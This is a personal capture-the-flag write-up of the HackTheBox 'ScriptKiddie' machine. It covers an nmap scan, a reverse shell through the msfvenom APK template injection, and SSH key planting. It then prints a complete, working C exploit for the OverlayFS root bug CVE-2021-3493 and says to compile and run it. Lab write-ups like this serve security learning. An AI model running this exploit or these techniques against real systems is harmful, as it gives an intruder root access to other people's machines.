---
layout: default
title : muzec - ScriptKiddie Writeup
---

![image](https://user-images.githubusercontent.com/69868171/119201650-570b1100-ba5d-11eb-8dac-6fd0e6620f82.png)

We always start with an nmap scan.....

```Nmap -sC -sV -oA nmap <Target-IP>```

```
# Nmap 7.91 scan initiated Fri May 21 10:33:31 2021 as: nmap -sC -sV -oA nmap 10.10.10.226
Nmap scan report for 10.10.10.226
Host is up (0.39s latency).
Not shown: 997 closed ports
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
1801/tcp filtered msmq
5000/tcp open     http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-server-header: Werkzeug/0.16.1 Python/3.8.5
|_http-title: k1d'5 h4ck3r t00l5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri May 21 10:34:38 2021 -- 1 IP address (1 host up) scanned in 67.14 seconds
```

We have a web application running on port 5000 Werkzeug httpd 0.16.1 (Python 3.8.5) let hit it .

![image](https://user-images.githubusercontent.com/69868171/119203468-1b724600-ba61-11eb-9901-edf3879d83ff.png)

Bursting directory but got nothing now let try to put what we have in order going through the web application.

![image](https://user-images.githubusercontent.com/69868171/119203719-be2ac480-ba61-11eb-9b27-b6d4e26bba82.png)

I found here interesting seems like a msfvenom APK Template Command Injection exploit that was recently release.

![image](https://user-images.githubusercontent.com/69868171/119203911-2f6a7780-ba62-11eb-8ea1-5dc0a50ac24f.png)

![image](https://user-images.githubusercontent.com/69868171/119203956-45783800-ba62-11eb-8d55-b3a5214a258d.png)

### Exploit Description

This module exploits a command injection vulnerability in Metasploit Framework's msfvenom payload generator when using a crafted APK file as an Android payload template. Affects Metasploit Framework <= 6.0.11 and Metasploit Pro <= 4.18.0. The file produced by this module is a relatively empty yet valid-enough APK file. To trigger the vulnerability, the victim user should do the following: msfvenom -p android/<...> -x 

![image](https://user-images.githubusercontent.com/69868171/119204046-82442f00-ba62-11eb-911e-c55ba5a0fae4.png)

Now let generate one using the metasploit module, Launching metasploit with `msfconsole` and use module .

![image](https://user-images.githubusercontent.com/69868171/119204219-e961e380-ba62-11eb-8c4c-17891e84623e.png)

Apk generated now let try and get a reverse shell on the web application and aslo start an Ncat listener with the port we add when generating the APK.

![image](https://user-images.githubusercontent.com/69868171/119204431-668d5880-ba63-11eb-828a-16b7a0cc49df.png)

Since we generated a APk we pick `OS:` android `lhost:` VPN-IP `template file (optional):` let pick the APK we generated and click on generate when we hit it going back to our listener give us a reverse shell back.

![image](https://user-images.githubusercontent.com/69868171/119204759-4f029f80-ba64-11eb-9400-ea4c7e457839.png)

And going to the home directory we have `user.txt` also seems we have access to the SSH folder let add our public key to it to be able to SSH into the machine with the user `kid` .

![image](https://user-images.githubusercontent.com/69868171/119204832-912be100-ba64-11eb-8616-856cf60de14e.png)

Adding SSH public key .

![image](https://user-images.githubusercontent.com/69868171/119205028-0f888300-ba65-11eb-96cd-53c06c27d430.png)

SSH we are in.

![image](https://user-images.githubusercontent.com/69868171/119205095-4199e500-ba65-11eb-9a7f-aa2724a9e251.png)

### Privilege Escalation

I know we have another user on the machine but got no access to it so let try and check for kernal version and running process etc.

![image](https://user-images.githubusercontent.com/69868171/119205244-bd942d00-ba65-11eb-9804-3ed736e50cd3.png)

![image](https://user-images.githubusercontent.com/69868171/119205318-f3d1ac80-ba65-11eb-8ad3-5b46ad4237f3.png)

Ok let run `linpeas.sh` to enumerate the machine well  to see what we are missing .

![image](https://user-images.githubusercontent.com/69868171/119205757-2e881480-ba67-11eb-95ee-d1c3606e46e0.png)

Seems `overlayfs` i recently write about it give it a read here [OverlayFS - Local Privilege Escalation - CVE-2021-3493 (POC)](https://muzec0318.github.io/posts/overlayfs.html) .

Now we can just copy the exploit and save in a file maybe `exploit.c` exploit code below .

```
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/mount.h>

//#include <attr/xattr.h>
//#include <sys/xattr.h>
int setxattr(const char *path, const char *name, const void *value, size_t size, int flags);


#define DIR_BASE    "./ovlcap"
#define DIR_WORK    DIR_BASE "/work"
#define DIR_LOWER   DIR_BASE "/lower"
#define DIR_UPPER   DIR_BASE "/upper"
#define DIR_MERGE   DIR_BASE "/merge"
#define BIN_MERGE   DIR_MERGE "/magic"
#define BIN_UPPER   DIR_UPPER "/magic"


static void xmkdir(const char *path, mode_t mode)
{
    if (mkdir(path, mode) == -1 && errno != EEXIST)
        err(1, "mkdir %s", path);
}

static void xwritefile(const char *path, const char *data)
{
    int fd = open(path, O_WRONLY);
    if (fd == -1)
        err(1, "open %s", path);
    ssize_t len = (ssize_t) strlen(data);
    if (write(fd, data, len) != len)
        err(1, "write %s", path);
    close(fd);
}

static void xcopyfile(const char *src, const char *dst, mode_t mode)
{
    int fi, fo;

    if ((fi = open(src, O_RDONLY)) == -1)
        err(1, "open %s", src);
    if ((fo = open(dst, O_WRONLY | O_CREAT, mode)) == -1)
        err(1, "open %s", dst);

    char buf[4096];
    ssize_t rd, wr;

    for (;;) {
        rd = read(fi, buf, sizeof(buf));
        if (rd == 0) {
            break;
        } else if (rd == -1) {
            if (errno == EINTR)
                continue;
            err(1, "read %s", src);
        }

        char *p = buf;
        while (rd > 0) {
            wr = write(fo, p, rd);
            if (wr == -1) {
                if (errno == EINTR)
                    continue;
                err(1, "write %s", dst);
            }
            p += wr;
            rd -= wr;
        }
    }

    close(fi);
    close(fo);
}

static int exploit()
{
    char buf[4096];

    sprintf(buf, "rm -rf '%s/'", DIR_BASE);
    system(buf);

    xmkdir(DIR_BASE, 0777);
    xmkdir(DIR_WORK,  0777);
    xmkdir(DIR_LOWER, 0777);
    xmkdir(DIR_UPPER, 0777);
    xmkdir(DIR_MERGE, 0777);

    uid_t uid = getuid();
    gid_t gid = getgid();

    if (unshare(CLONE_NEWNS | CLONE_NEWUSER) == -1)
        err(1, "unshare");

    xwritefile("/proc/self/setgroups", "deny");

    sprintf(buf, "0 %d 1", uid);
    xwritefile("/proc/self/uid_map", buf);

    sprintf(buf, "0 %d 1", gid);
    xwritefile("/proc/self/gid_map", buf);

    sprintf(buf, "lowerdir=%s,upperdir=%s,workdir=%s", DIR_LOWER, DIR_UPPER, DIR_WORK);
    if (mount("overlay", DIR_MERGE, "overlay", 0, buf) == -1)
        err(1, "mount %s", DIR_MERGE);

    // all+ep
    char cap[] = "\x01\x00\x00\x02\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00";

    xcopyfile("/proc/self/exe", BIN_MERGE, 0777);
    if (setxattr(BIN_MERGE, "security.capability", cap, sizeof(cap) - 1, 0) == -1)
        err(1, "setxattr %s", BIN_MERGE);

    return 0;
}

int main(int argc, char *argv[])
{
    if (strstr(argv[0], "magic") || (argc > 1 && !strcmp(argv[1], "shell"))) {
        setuid(0);
        setgid(0);
        execl("/bin/bash", "/bin/bash", "--norc", "--noprofile", "-i", NULL);
        err(1, "execl /bin/bash");
    }

    pid_t child = fork();
    if (child == -1)
        err(1, "fork");

    if (child == 0) {
        _exit(exploit());
    } else {
        waitpid(child, NULL, 0);
    }

    execl(BIN_UPPER, BIN_UPPER, "shell", NULL);
    err(1, "execl %s", BIN_UPPER);
}
```

We can using nano to save it.

![image](https://user-images.githubusercontent.com/69868171/119206052-1369d480-ba68-11eb-872f-56e0e076eee3.png)

Now let compile it using `gcc exploit.c -o exploit` .

![image](https://user-images.githubusercontent.com/69868171/119206177-693e7c80-ba68-11eb-820c-0a783e34fab9.png)

Now let run the exploit.

![image](https://user-images.githubusercontent.com/69868171/119206230-8e32ef80-ba68-11eb-9f29-4f2e3485deb7.png)

We are root box rooted.

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>


